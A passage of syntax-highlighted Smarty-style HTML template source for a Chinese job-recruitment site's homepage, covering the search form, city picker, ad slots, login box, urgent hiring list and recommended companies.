            <span class="nt">&lt;div</span> <span class="na">title=</span><span class="s">"找工作"</span> <span class="na">code=</span><span class="s">"QS_jobslist"</span> <span class="na">data=</span><span class="s">"请输入职位名称或企业名称"</span> <span class="na">class=</span><span class="s">"search-type-show"</span><span class="nt">&gt;&lt;span&gt;</span>找工作<span class="nt">&lt;/span&gt;&lt;i</span> <span class="na">class=</span><span class="s">"search-icon"</span><span class="nt">&gt;&lt;/i&gt;&lt;/div&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">title=</span><span class="s">"找人才"</span> <span class="na">code=</span><span class="s">"QS_resumelist"</span> <span class="na">data=</span><span class="s">"请输入简历关键字"</span> <span class="na">class=</span><span class="s">"search-type-drop"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"javascript:;"</span><span class="nt">&gt;</span>找人才<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"search-text f-left"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"keyForIndexSearch"</span> <span class="na">id=</span><span class="s">"keyForIndexSearch"</span> <span class="na">placeholder=</span><span class="s">"请输入职位名称或企业名称"</span> <span class="nt">/&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"search-box f-left"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"search-area-box"</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"cityForIndexSearch"</span> <span class="na">id=</span><span class="s">"cityForIndexSearch"</span> <span class="na">placeholder=</span><span class="s">"请输入工作地区"</span> <span class="nt">/&gt;&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"search-submit f-left"</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">name=</span><span class="s">"btnForIndexSearch"</span> <span class="na">id=</span><span class="s">"btnForIndexSearch"</span> <span class="na">code=</span><span class="s">"QS_jobslist"</span> <span class="na">value=</span><span class="s">"搜索"</span> <span class="na">class=</span><span class="s">"search-submit"</span> <span class="nt">/&gt;&lt;/div&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"citycategory"</span> <span class="na">id=</span><span class="s">"citycategory"</span> <span class="na">value=</span><span class="s">""</span><span class="nt">&gt;</span>
        <span class="c">&lt;!-- 工作地区弹出框 --&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"aui_outer"</span> <span class="na">id=</span><span class="s">"aui_outer_city"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;table</span> <span class="na">class=</span><span class="s">"aui_border"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;tbody&gt;</span>
              <span class="nt">&lt;tr&gt;</span>
                <span class="nt">&lt;td</span> <span class="na">class=</span><span class="s">"aui_c"</span><span class="nt">&gt;</span>
                  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"aui_inner"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;table</span> <span class="na">class=</span><span class="s">"aui_dialog"</span><span class="nt">&gt;</span>
                      <span class="nt">&lt;tbody&gt;</span>
                        <span class="nt">&lt;tr&gt;</span>
                          <span class="nt">&lt;td</span> <span class="na">class=</span><span class="s">"aui_main"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"aui_content"</span> <span class="na">style=</span><span class="s">"padding: 0px;"</span><span class="nt">&gt;</span>
                              <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"LocalDataMultiC"</span> <span class="na">style=</span><span class="s">"width:623px;"</span><span class="nt">&gt;</span>
                                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"selector-header"</span><span class="nt">&gt;&lt;span</span> <span class="na">class=</span><span class="s">"selector-title"</span><span class="nt">&gt;</span>选择地区<span class="nt">&lt;/span&gt;&lt;div&gt;&lt;/div&gt;&lt;span</span> <span class="na">id=</span><span class="s">"ct-selector-save"</span> <span class="na">class=</span><span class="s">"selector-save"</span><span class="nt">&gt;</span>确定<span class="nt">&lt;/span&gt;&lt;span</span> <span class="na">class=</span><span class="s">"selector-close"</span><span class="nt">&gt;</span>X<span class="nt">&lt;/span&gt;&lt;div</span> <span class="na">class=</span><span class="s">"clear"</span><span class="nt">&gt;&lt;/div&gt;&lt;/div&gt;</span>

                                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"data-row-head"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"data-row"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"data-row-side data-row-side-c"</span><span class="nt">&gt;</span>最多选 <span class="nt">&lt;strong</span> <span class="na">class=</span><span class="s">"text-warning"</span><span class="nt">&gt;</span>3<span class="nt">&lt;/strong&gt;</span> 项  已选 <span class="nt">&lt;strong</span> <span class="na">id=</span><span class="s">"arscity"</span> <span class="na">class=</span><span class="s">"text-warning"</span><span class="nt">&gt;</span>0<span class="nt">&lt;/strong&gt;</span> 项<span class="nt">&lt;/div&gt;&lt;div</span> <span class="na">id=</span><span class="s">"result-list-city"</span> <span class="na">class=</span><span class="s">"result-list data-row-side-ra"</span><span class="nt">&gt;&lt;/div&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"cla"</span><span class="nt">&gt;&lt;/div&gt;&lt;/div&gt;</span>
                                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"data-row-list data-row-main"</span> <span class="na">id=</span><span class="s">"city_list"</span><span class="nt">&gt;</span>
                                  <span class="c">&lt;!-- 列表内容 --&gt;</span>
                                <span class="nt">&lt;/div&gt;</span>
                              <span class="nt">&lt;/div&gt;</span>
                            <span class="nt">&lt;/div&gt;</span>
                          <span class="nt">&lt;/td&gt;</span>
                        <span class="nt">&lt;/tr&gt;</span>
                      <span class="nt">&lt;/tbody&gt;</span>
                    <span class="nt">&lt;/table&gt;</span>
                  <span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/td&gt;</span>
              <span class="nt">&lt;/tr&gt;</span>
            <span class="nt">&lt;/tbody&gt;</span>
          <span class="nt">&lt;/table&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="c">&lt;!-- 工作地区弹出框 End--&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
      <span class="c">&lt;!-- 搜索结束 --&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"swipe-wrap"</span><span class="nt">&gt;</span>
        {#qishi_ad set="显示数目:6,调用名称:QS_indexfocus,列表名:ad"#}
        <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"playBox"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"pre"</span><span class="nt">&gt;&lt;/div&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"next"</span><span class="nt">&gt;&lt;/div&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"smalltitle"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;ul&gt;</span>
              {#section loop=$ad name=list#}
              <span class="nt">&lt;li</span> <span class="err">{</span><span class="na">#if</span> <span class="err">$</span><span class="na">smarty</span><span class="err">.</span><span class="na">section</span><span class="err">.</span><span class="na">list</span><span class="err">.</span><span class="na">first#</span><span class="err">}</span><span class="na">class=</span><span class="s">"thistitle"</span><span class="err">{</span><span class="na">#</span><span class="err">/</span><span class="na">if#</span><span class="err">}</span><span class="nt">&gt;&lt;/li&gt;</span>
              {#/section#}
            <span class="nt">&lt;/ul&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
          <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"oUlplay"</span><span class="nt">&gt;</span>
             {#foreach from=$ad item=list#}
             <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.img_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>![]({#$list.img_path#})<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
             {#/foreach#}
          <span class="nt">&lt;/ul&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"block-ad-wrap clearfix lazyload"</span><span class="nt">&gt;</span>
        {#qishi_ad set="显示数目:6,调用名称:QS_indexrecommend,列表名:ad"#}
        {#if $ad#}
          {#foreach from=$ad item=list#}
          {#if $list.img_uid&gt;0#}
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"block-ad-item f-left"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"block-ad-logo"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.img_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>![]({#$QISHI.site_template#}images/index/84.gif)<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"block-ad-info"</span><span class="nt">&gt;</span>
              <span class="nt">&lt;h3&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.company_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$list.companyname#}<span class="nt">&lt;/a&gt;&lt;/h3&gt;</span>
              <span class="nt">&lt;p&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.jobs.0.jobs_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$list.jobs.0.jobs_name#}<span class="nt">&lt;/a&gt;&lt;/p&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
          {#else#}
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"block-ad-item f-left"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.img_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>
              ![]({#$QISHI.site_template#}images/index/84.jpg)
            <span class="nt">&lt;/a&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
          {#/if#}
          {#/foreach#}
        {#/if#}
      <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"complex-right f-left"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"login-block"</span> <span class="na">id=</span><span class="s">"ajax_login"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;h4&gt;</span>会员登录<span class="nt">&lt;/h4&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"login-wrap"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"login-item"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"login-text-box clearfix"</span><span class="nt">&gt;&lt;i</span> <span class="na">class=</span><span class="s">"login-icon user f-left"</span><span class="nt">&gt;&lt;/i&gt;&lt;div</span> <span class="na">class=</span><span class="s">"login-input f-left"</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">""</span> <span class="na">id=</span><span class="s">""</span> <span class="na">placeholder=</span><span class="s">"邮箱/手机号/用户名"</span> <span class="nt">/&gt;&lt;/div&gt;&lt;/div&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"login-item"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"login-text-box clearfix"</span><span class="nt">&gt;&lt;i</span> <span class="na">class=</span><span class="s">"login-icon pass f-left"</span><span class="nt">&gt;&lt;/i&gt;&lt;div</span> <span class="na">class=</span><span class="s">"login-input f-left"</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">""</span> <span class="na">id=</span><span class="s">""</span> <span class="na">placeholder=</span><span class="s">"请输入密码"</span> <span class="nt">/&gt;&lt;/div&gt;&lt;/div&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"login-item clearfix"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;label</span> <span class="na">class=</span><span class="s">"auto-login f-left"</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">"checkbox"</span> <span class="na">name=</span><span class="s">""</span> <span class="na">id=</span><span class="s">""</span> <span class="nt">/&gt;</span>自动登录<span class="nt">&lt;/label&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">""</span> <span class="na">class=</span><span class="s">"forget underline f-right"</span><span class="nt">&gt;</span>忘记密码？<span class="nt">&lt;/a&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"login-item clearfix"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"login-btn-box f-left"</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">value=</span><span class="s">"立即登录"</span> <span class="na">class=</span><span class="s">"index-login-btn"</span> <span class="nt">/&gt;&lt;/div&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"f-left"</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">value=</span><span class="s">"免费注册"</span> <span class="na">class=</span><span class="s">"index-reg-btn"</span> <span class="nt">/&gt;&lt;/div&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"third-login clearfix"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"f-left"</span><span class="nt">&gt;</span>其他账户登录：<span class="nt">&lt;/span&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">""</span> <span class="na">class=</span><span class="s">"third-icon qq f-left"</span><span class="nt">&gt;&lt;/a&gt;&lt;a</span> <span class="na">href=</span><span class="s">""</span> <span class="na">class=</span><span class="s">"third-icon sina f-left"</span><span class="nt">&gt;&lt;/a&gt;&lt;a</span> <span class="na">href=</span><span class="s">""</span> <span class="na">class=</span><span class="s">"third-icon taobao f-left"</span><span class="nt">&gt;&lt;/a&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"urgent-block"</span> <span class="na">id=</span><span class="s">"emergencybox"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"urgent-title clearfix"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;h4</span> <span class="na">class=</span><span class="s">"f-left"</span><span class="nt">&gt;</span>紧急招聘<span class="nt">&lt;/h4&gt;</span>
          <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#"</span><span class="na">QS_jobs</span><span class="err">"|</span><span class="na">qishi_url#</span><span class="err">}"</span> <span class="na">class=</span><span class="s">"underline f-right"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>更多&gt;&gt;<span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"urgent-list"</span><span class="nt">&gt;</span>
          {#qishi_jobs_list set="列表名:jobs,显示数目:10,职位名长度:12,企业名长度:12,紧急招聘:1,排序:refreshtime&gt;desc"#}
          {#foreach from=$jobs item=list#}
          <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"clearfix"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.company_url#}"</span> <span class="na">class=</span><span class="s">"u-com f-left underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$list.companyname#}<span class="nt">&lt;/a&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.jobs_url#}"</span> <span class="na">class=</span><span class="s">"u-job f-left underline"</span> <span class="na">title=</span><span class="s">"{#$list.jobs_name_#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$list.jobs_name#}<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
          {#/foreach#}
        <span class="nt">&lt;/ul&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="c">&lt;!-- 广告位集中区域 --&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-area"</span><span class="nt">&gt;</span>
    <span class="c">&lt;!-- 1198*58 广告  --&gt;</span>
    {#qishi_ad set="显示数目:3,调用名称:QS_indextopimg,列表名:ad,文字长度:12"#}
    {#if $ad#}
    {#foreach from=$ad item=list#}
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-row clearfix lazyload"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-item ad-full f-left"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.img_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>![]({#$QISHI.site_template#}images/index/84.gif)<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    {#/foreach#}
    {#/if#}
    <span class="c">&lt;!-- 392*58 广告  格子广告--&gt;</span>
    {#qishi_ad set="显示数目:6,调用名称:QS_indexcentreimg,列表名:ad,文字长度:12"#}
    {#if $ad#}
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-row clearfix lazyload"</span><span class="nt">&gt;</span>
      {#foreach from=$ad item=list#}
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-item ad-31 f-left comimgtip"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.img_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>![]({#$QISHI.site_template#}images/index/84.gif)<span class="nt">&lt;/a&gt;</span>
        {#if $list.jobs#}
        <span class="c">&lt;!-- 鼠标至上显示 --&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-more-info info31"</span> <span class="na">style=</span><span class="s">"display: none;"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-placeholder"</span><span class="nt">&gt;&lt;/div&gt;</span>
          <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"ad-job-list"</span><span class="nt">&gt;</span>
            {#foreach from=$list.jobs item=jobs_li#}
            <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"clearfix"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"jobname f-left"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$jobs_li.jobs_url#}"</span> <span class="na">class=</span><span class="s">"underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$jobs_li.jobs_name#}<span class="nt">&lt;/a&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"jobpay f-left"</span><span class="nt">&gt;&lt;span&gt;</span>{#$jobs_li.wage_cn#}<span class="nt">&lt;/span&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"jobnarea f-left"</span><span class="nt">&gt;</span>{#$jobs_li.district_cn#}<span class="nt">&lt;/div&gt;&lt;/li&gt;</span>
            {#/foreach#}
          <span class="nt">&lt;/ul&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-com-info"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"companyname"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.company_url#}"</span> <span class="na">class=</span><span class="s">"underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$list.companyname#}<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
            <span class="nt">&lt;p&gt;</span>{#$list.briefly#}<span class="nt">&lt;/p&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
          <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.company_url#}"</span> <span class="na">class=</span><span class="s">"ad-more"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>查看更多内容&gt;&gt;<span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        {#/if#}
      <span class="nt">&lt;/div&gt;</span>
      {#/foreach#}
    <span class="nt">&lt;/div&gt;</span>
    {#/if#}
    <span class="c">&lt;!-- 230x58 广告  格子广告--&gt;</span>
    {#qishi_ad set="显示数目:10,调用名称:QS_indexcentreimg_230x58,列表名:ad,文字长度:12"#}
    {#if $ad#}
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-row a23058d clearfix lazyload"</span><span class="nt">&gt;</span>
      {#foreach from=$ad item=list#}
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-item ad-51 f-left comimgtip"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.img_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>![]({#$QISHI.site_template#}images/index/84.gif)<span class="nt">&lt;/a&gt;</span>
        {#if $list.jobs#}
        <span class="c">&lt;!-- 鼠标至上显示 --&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-more-info info51"</span> <span class="na">style=</span><span class="s">"display: none;"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-placeholder"</span><span class="nt">&gt;&lt;/div&gt;</span>
          <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"ad-job-list"</span><span class="nt">&gt;</span>
            {#foreach from=$list.jobs item=jobs_li#}
            <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"clearfix"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"jobname f-left"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$jobs_li.jobs_url#}"</span> <span class="na">class=</span><span class="s">"underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$jobs_li.jobs_name#}<span class="nt">&lt;/a&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"jobpay f-left"</span><span class="nt">&gt;&lt;span&gt;</span>{#$jobs_li.wage_cn#}<span class="nt">&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;</span>
            {#/foreach#}
          <span class="nt">&lt;/ul&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-com-info ad-com-info-w"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"companyname"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.company_url#}"</span> <span class="na">class=</span><span class="s">"underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$list.companyname#}<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
            <span class="nt">&lt;p&gt;</span>{#$list.briefly#}<span class="nt">&lt;/p&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
          <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.company_url#}"</span> <span class="na">class=</span><span class="s">"ad-more"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>查看更多内容&gt;&gt;<span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        {#/if#}
      <span class="nt">&lt;/div&gt;</span>
      {#/foreach#}
    <span class="nt">&lt;/div&gt;</span>
    {#/if#}
  <span class="nt">&lt;/div&gt;</span>
  <span class="c">&lt;!-- 广告位集中区域结束 --&gt;</span>
  <span class="c">&lt;!-- 列表-推荐职位 --&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"index-data-wrap index-data-wrap-i7"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"blue-line"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"data-title-box clearfix"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;h4</span> <span class="na">class=</span><span class="s">"f-left"</span><span class="nt">&gt;</span>推荐职位<span class="nt">&lt;span&gt;</span>Recommended Job<span class="nt">&lt;/span&gt;&lt;/h4&gt;</span>
      <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#"</span><span class="na">QS_helplist</span><span class="err">,</span><span class="na">id:10</span><span class="err">"|</span><span class="na">qishi_url#</span><span class="err">}"</span> <span class="na">class=</span><span class="s">"f-right underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>我是招聘单位，我想出现在这里<span class="nt">&lt;/a&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"famous-list clearfix"</span><span class="nt">&gt;</span>
      {#qishi_companyjobs_list set="列表名:comjob_recommend,显示数目:12,显示职位:3,推荐:1,统计职位:1"#}
      {#foreach from=$comjob_recommend item=list#}
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"famous-items f-left"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fc-icon"</span><span class="nt">&gt;&lt;/i&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"famous-com comtip"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.company_url#}"</span> <span class="na">class=</span><span class="s">"underline"</span> <span class="na">target=</span><span class="s">"_balnk"</span><span class="nt">&gt;</span>{#$list.companyname#}{#if $QISHI.operation_mode&gt;="2" <span class="err">&amp;&amp;</span>  $list.setmeal_id&gt;1 #} ![]({#$QISHI.site_dir#}data/setmealimg/{#$list.setmeal_id#}.gif){#/if#}<span class="nt">&lt;/a&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"famous-more-info"</span> <span class="na">style=</span><span class="s">"display:none;"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fmi-icon"</span><span class="nt">&gt;&lt;/i&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fmi-title"</span><span class="nt">&gt;</span>招聘岗位<span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"fmi-list"</span><span class="nt">&gt;</span>
              {#qishi_jobs_list set="列表名:com_jobs_all,显示数目:3,会员UID:$list.uid"#}
              {#foreach from=$com_jobs_all item=job_li#}
              <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"clearfix"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fmi-jobname f-left"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$job_li.jobs_url#}"</span> <span class="na">class=</span><span class="s">"underline"</span> <span class="na">target=</span><span class="s">"_balnk"</span><span class="nt">&gt;</span>{#$job_li.jobs_name#}<span class="nt">&lt;/a&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"fmi-time f-left"</span><span class="nt">&gt;&lt;span&gt;</span>{#$job_li.refreshtime_cn#}<span class="nt">&lt;/span&gt;&lt;/div&gt;</span>
              <span class="nt">&lt;/li&gt;</span>
              {#/foreach#}
            <span class="nt">&lt;/ul&gt;</span>
            <span class="nt">&lt;p&gt;</span>该企业共有{#$list.jobs_num#}个职位，<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#"</span><span class="na">QS_companyjobs</span><span class="err">,</span><span class="na">id:</span><span class="err">$</span><span class="na">list</span><span class="err">.</span><span class="na">company_id</span><span class="err">"|</span><span class="na">qishi_url#</span><span class="err">}"</span> <span class="na">target=</span><span class="s">"_balnk"</span> <span class="na">class=</span><span class="s">"underline"</span><span class="nt">&gt;</span>查看全部<span class="nt">&lt;/a&gt;&lt;/p&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"famous-job"</span><span class="nt">&gt;</span>
          {#foreach from=$list.jobs item=jobs_li#}
          <span class="nt">&lt;span&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$jobs_li.jobs_url#}"</span> <span class="na">class=</span><span class="s">"underline"</span> <span class="na">target=</span><span class="s">"_balnk"</span><span class="nt">&gt;</span>{#$jobs_li.jobs_name#}<span class="nt">&lt;/a&gt;&lt;/span&gt;</span>
          {#/foreach#}
